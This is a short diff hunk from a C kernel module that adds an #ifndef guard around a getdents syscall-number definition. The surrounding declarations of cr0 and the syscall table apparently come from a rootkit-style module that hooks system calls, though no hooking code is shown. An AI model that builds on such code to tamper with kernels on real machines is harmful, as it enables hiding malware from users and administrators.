@@ -39,9 +39,12 @@ unsigned long cr0;
 unsigned long *__syscall_table;
 unsigned long __force_order;
 
+#ifndef __NR_getdents
 enum NR_getdents{
 	__NR_getdents = 141
 };
+
+#endif
 
 /* This is an old structure that isn't included in the kernel headers anymore 
  * so we have to declare it ourselves */
